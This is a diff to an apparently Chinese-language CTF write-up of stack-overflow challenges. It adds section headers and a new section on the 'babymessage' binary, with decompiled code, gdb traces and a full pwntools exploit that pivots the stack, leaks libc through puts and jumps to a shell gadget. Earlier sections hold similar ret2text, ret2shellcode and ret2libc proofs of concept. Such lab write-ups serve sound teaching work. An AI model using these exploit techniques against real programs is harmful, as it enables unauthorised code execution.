@@ -2,6 +2,8 @@
 
 # 基础-`ret2text`
 
+##  题目分析
+
 首先看看程序的`checksec`
 
 ```shell
@@ -32,6 +34,8 @@ __int64 vuln()
 
 可以利用`scanf`进行栈溢出，覆写`rip`地址为`getshell`地址。从`ida`的反汇编代码可以看出，变量`v1`的地址位于`rbp-0x10`的位置，那么`payload`就可以由以下部分组成：大小为`0x10`的数据填充`v1`，8字节指针覆盖`rsp`，最后8字节指针覆盖`rip`，跳转至`getshell()`。设计一个简单的`payload = 'A'*0x10+p64(0xdeadbeef)+p64(&getshell)`
 
+## 调试分析
+
 连上`gdb`调试，在执行`scanf`前，指令流、堆栈和寄存器信息如图：
 
 <img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813230534367.png" alt="image-20200813230534367" style="zoom:40%;" />
@@ -40,7 +44,7 @@ __int64 vuln()
 
 <img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813231630169.png" alt="image-20200813231630169" style="zoom:40%;" />
 
-完整`poc`如下：
+## POC
 
 ```python
 p = process('./pwn1')
@@ -54,6 +58,8 @@ p.interactive()
 ```
 
 # `bss`段利用-`ret2shellcode`
+
+## 题目分析
 
 程序的`checksec`信息如下：
 
@@ -81,6 +87,8 @@ payload += p64(0xdeadbeef)#rbp
 payload += p64(&name)#跳转至shellcode
 ```
 
+## 调试分析
+
 在`gdb`调试器中，第一次`read`执行完毕后，`bss`段的`name`内容被填充为`shellcode`：
 
 ![image-20200813234411658](https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813234411658.png)
@@ -97,7 +105,7 @@ payload += p64(&name)#跳转至shellcode
 
 ![image-20200813234951524](https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813234951524.png)
 
-完整`poc`如下：
+## POC
 
 ```python
 from pwn import *
@@ -114,6 +122,8 @@ p.interactive()
 ```
 
 # 构造`ROP`-`ret2libc`
+
+## 题目分析
 
 程序`checksec`信息如下：
 
@@ -157,6 +167,8 @@ payload += plt['puts']# => RIP => puts(got['puts'])
 payload += addr_of_vuln #程序执行流回到vuln，利用gets函数再次进行操作
 ```
 
+## 调试分析
+
 在调用`gets`前，程序执行流如下：
 
 <img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814102030969.png" alt="image-20200814102030969" style="zoom:40%;" />
@@ -191,7 +203,7 @@ payload += addr_of_system() # => RIP => system('/bin/sh')
 
 <img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814104006855.png" alt="image-20200814104006855" style="zoom:40%;" />
 
-完整`poc`如下：
+## POC
 
 ```python
 #coding:UTF-8
@@ -256,6 +268,8 @@ p.interactive()
 ```
 
 # 利用程序崩溃信息-`smashing`
+
+## 题目分析
 
 程序`checksec`信息如下
 
@@ -330,7 +344,11 @@ error!
 Aborted
 ```
 
-报错输出里面的程序名称不见了，可以确定输入的数据能覆写到`argv[0]`。据此，漏洞利用的思路为：`PIE`未开启，程序的指令数据的内存位置固定，可以覆写栈一路直到`argv[0]`的地址，然后把`flag`的地址放上去。在`gets()`前下断点，`rdi`寄存器的值为写入缓冲区的地址；也可以在`gets()`的函数栈中用`info args`来查看参数：
+报错输出里面的程序名称不见了，可以确定输入的数据能覆写到`argv[0]`。据此，漏洞利用的思路为：`PIE`未开启，程序的指令数据的内存位置固定，可以覆写栈一路直到`argv[0]`的地址，然后把`flag`的地址放上去。
+
+## 调试分析
+
+在`gets()`前下断点，`rdi`寄存器的值为写入缓冲区的地址；也可以在`gets()`的函数栈中用`info args`来查看参数：
 
 <img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814133416462.png" alt="image-20200814133416462" style="zoom:50%;" />
 
@@ -355,7 +373,7 @@ error!
 [*] Got EOF while reading in interactive
 ```
 
-完整`poc`如下：
+## POC
 
 ```python
 from pwn import *
@@ -369,4 +387,285 @@ payload += p64(flag_addr)
 p.sendlineafter('Passwd:',payload)
 p.interactive()
 ```
+
+# 栈迁移-`babymessage`
+
+## 题目分析
+
+程序`checksec`信息如下：
+
+```shell
+[*] '/home/hjc18/PWN/qwb2020/babymessage/babymessage'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3fe000)
+```
+
+只开了`NX`，没有`Canary`和`PIE`。
+
+`main`函数的逻辑是经典的菜单题：
+
+```cpp
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  menu();
+  work();
+  return 0;
+}
+```
+
+`work`是程序的主流程函数，几个`while/break`看起来好像云里雾里，实际上是一个简单的`switch`逻辑。通过输入`mm`来切换执行的流程，那么相应的，传入的参数也被`mm`所控制。不过细看程序逻辑，`v1`的类型为`signed int`，`leave_message`前`v1`的校验逻辑只包含上界而无下界，意味着`v1`为负可以绕过第一个校验——由此产生一个思路：如何通过修改`v1`来控制传入参数：
+
+```cpp
+__int64 work()
+{
+  signed int v1; // [rsp+Ch] [rbp-4h]
+
+  buf = (char *)malloc(0x100uLL);
+  v1 = mm + 0x10;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          puts("choice: ");
+          __isoc99_scanf("%d", &mm);
+          if ( mm != 1 )
+            break;
+          leave_name();
+        }
+        if ( mm != 2 )
+          break;
+        if ( v1 > 0x100 )//incomplete arg check!! 
+          v1 = 256;
+        leave_message(v1);//v1 was controled by mm => 0x12
+      }
+      if ( mm != 3 )
+        break;
+      show(v1);//v1 was controled by mm => 0x13
+    }
+    if ( mm == 4 )
+      break;
+    puts("invalid choice");
+  }
+  return 0LL;
+}
+```
+
+`leave_name`的作用为改写`BSS`段上的`name`变量，不过程序开启了`NX`，无法利用`ret2shellcode`；限制了`name`的读取长度为4：
+
+```cpp
+__int64 leave_name()
+{
+  puts("name: ");
+  name[(signed int)read(0, name, 4uLL)] = 0; 
+  puts("done!\n");
+  return 0LL;
+}
+
+# BSS
+.bss:00000000006010D0 name            db 10h dup(?)           ; DATA XREF: leave_name+15↑o
+.bss:00000000006010D0                                         ; leave_name+2E↑o ...
+.bss:00000000006010D0 _bss            ends
+```
+
+`leave_message`将用户的输入读入至栈上的缓冲区，长度限制为传入的参数——注意，传入的参数类型为`unsigned int`，由先前的分析，如果传入`v1`的值为负，转换后的长度限制将非常大。这个点跟`work`里的负数溢出思路对应，看来方向没错。如果不修改`v1`的值，输入的长度限制为`0x12`，刚好够溢出`RBP`加上`RIP`的低4个字节。不过程序内部没有`get_shell`函数，`RIP`四个字节不够用：
+
+```cpp
+__int64 __fastcall leave_message(unsigned int size)
+{
+  int v1; // ST14_4
+  __int64 stack_buffer; // [rsp+18h] [rbp-8h]
+
+  puts("message: ");
+  v1 = read(0, &stack_buffer, size);            // size = 0x12
+  strncpy(buf, (const char *)&stack_buffer, v1);
+  buf[v1] = 0;
+  puts("done!\n");
+  return 0LL;
+}
+```
+
+`show`函数打印`name`和用户输入`buffer`的内容：
+
+```cpp
+__int64 __fastcall show(unsigned int a1)
+{
+  printf("%s says: ", name);
+  write(1, buf, a1);
+  return 0LL;
+}
+```
+
+## 调试分析
+
+初看起来是负数溢出，可是`v1`的值与`switch`绑定，没找到其他的修改方法。随手输入十几个字符试试，发现`crash`现场的`RBP`刚好被我们的输入覆盖了：
+
+```assembly
+Starting program: /home/hjc18/PWN/qwb2020/babymessage/babymessage
+Welcome to message system!
+1. leave name
+2. leave message
+3. show message
+4. exit
+choice:
+2
+message:
+ssssssssssssssssssssssssssssssssssssssssss
+done!
+
+# crash
+RBP  0x7373737373737373 ('ssssssss')
+RSP  0x7fffffffdc20 —▸ 0x7fffffffdd20 ◂— 0x1
+RIP  0x400985 (work+107) ◂— cmp    dword ptr [rbp - 4], 0x100
+```
+
+恍然大悟，看了看`leave_message`的汇编，`leave_ret`组合拳：
+
+```assembly
+.text:000000000040086F                 add     rax, rdx
+.text:0000000000400872                 mov     byte ptr [rax], 0
+.text:0000000000400875                 lea     rdi, aDone      ; "done!\n"
+.text:000000000040087C                 call    _puts
+.text:0000000000400881                 mov     eax, 0
+.text:0000000000400886                 leave  <- target!
+.text:0000000000400887                 retn
+.text:0000000000400887 ; } // starts at 40080A
+```
+
+这样一来可以用栈迁移的方法修改`v1`，覆盖`RBP`至`BSS`段的`name`变量，将`name`的数据解析成`v1`，继而修改`leave_message`的写入长度，将返回地址覆写为`puts`，获取基址的方法与`ret2libc`相同：
+
+```shell
+# shell
+[DEBUG] Received 0x5b bytes:
+    'Welcome to message system!\n'
+    '1. leave name\n'
+    '2. leave message\n'
+    '3. show message\n'
+    '4. exit\n'
+    'choice: \n'
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0x7 bytes:
+    'name: \n'
+[DEBUG] Sent 0x4 bytes:
+    00000000  50 00 00 0f => name: 0xf0000050
+
+# mod_rbp
+[DEBUG] Received 0x9 bytes:
+    'choice: \n'
+[DEBUG] Sent 0x2 bytes:
+    '2\n'
+[DEBUG] Received 0xa bytes:
+    'message: \n'
+[DEBUG] Sent 0x10 bytes:
+    00000000  41 41 41 41  41 41 41 41  d4 10 60 00  00 00 00 00  => overflow rbp to 0x6010d4(name+4)
+    
+# reg
+rsi  0x7ffc9311ac88 -> 0x4141414141414141 ('AAAAAAAA')
+rbp  0x7ffc9311ac90 -> 0x6010d4 (mm+20) 
+
+#assembly
+0x400985 <work+107>    cmp    dword ptr [rbp - 4], 0x100 -> rbp-4 -> name
+0x40098c <work+114>    jle    work+123 <0x400995> ->pass the check
+
+# modify the length of strncpy
+<leave_message+84>     call   strncpy@plt <0x400660>
+dest: 0x1c06260 -> 0x4141414141414141 ('AAAAAAAA')
+src: 0x7ffc9311ac88 -> 0x4141414141414141 ('AAAAAAAA')
+n: 0x30
+
+# stack_overflow to got
+rsp  0x7ffc9311ac98 -> 0x400ac3 (__libc_csu_init+99) <- pop    rdi
+     0x7ffc9311aca0 -> 0x601020 (_GLOBAL_OFFSET_TABLE_+32) -> 0x7f207b79fa30 (puts) <- push   r13
+     0x7ffc9311aca8 -> 0x400670 (puts@plt) -> jmp    qword ptr [rip + 0x2009aa]
+     0x7ffc9311acb0 -> 0x40091a (work) -> push   rbp
+     0x7ffc9311acb8 -> 0x400a4f (main+114) -> mov    eax, 0
+```
+
+## POC
+
+```python
+#coding:UTF-8
+
+from pwn import *
+
+def lauch_gdb(p):
+    context.log_level = 'debug'
+    context.terminal = ['tmux', 'splitw', '-h']
+    gdb.attach(p)
+
+def lauch_with_gdb(filename):
+    context.log_level = 'debug'
+    context.terminal = ['tmux', 'splitw', '-h']
+    p=gdb.debug(filename,"break main")
+    return p
+
+p = process('./babymessage')
+elf = ELF('./babymessage')
+libc = ELF('./libc-2.27.so')
+#work_addr = 0x40093F -> libc2.23可以成功，但2.27会crash
+main_addr = 0x40091A
+
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+rdi_ret = 0x400ac3
+
+#lauch_gdb(p)
+#pause()
+
+payload = 'A'*0x8+p64(0x6010D4)
+p.sendlineafter('choice:','1')
+p.sendafter('name:',p32(0xf000050))
+p.sendlineafter('choice:','2')
+p.sendafter('message:',payload)
+p.sendlineafter('choice:','2')
+payload_2 = 'A'*0x8
+payload_2 += p64(0x6010D4)
+
+
+payload_2 += p64(rdi_ret) # rip -> gadget地址
+payload_2 += p64(puts_got) #pop rdi -> 泄露puts地址 = libc基址+库内偏移
+payload_2 += p64(puts_plt) #ret->pop rip ->into puts
+payload_2 += p64(main_addr) #puts返回 -> final pos
+p.sendafter('message:',payload_2)
+
+puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+libc_base = puts_addr- libc.sym['puts']#计算libc基址
+
+
+system_addr = libc_base + libc.sym['system']#system函数地址
+binsh_addr = libc_base + libc.search('/bin/sh').next()#字符串地址
+log.info('libc_base:'+hex(libc_base))
+log.info('system_base:'+hex(system_addr))
+log.info('binsh_base:'+hex(binsh_addr))
+
+#第二次rop 劫持流程
+payload = 'A'*0x8+p64(0x6010D4)
+p.sendlineafter('choice:','1')
+p.sendafter('name:',p32(0xf000050))
+p.sendlineafter('choice:','2')
+p.sendafter('message:',payload)
+p.sendlineafter('choice:','2')
+
+
+#pause()
+payload = 'A' * 0x8
+payload += p64(0x6010D4)
+payload += p64(libc_base+0x4f365)
+p.sendafter('message:',payload)
+
+p.interactive()
+
+```
+
+
 
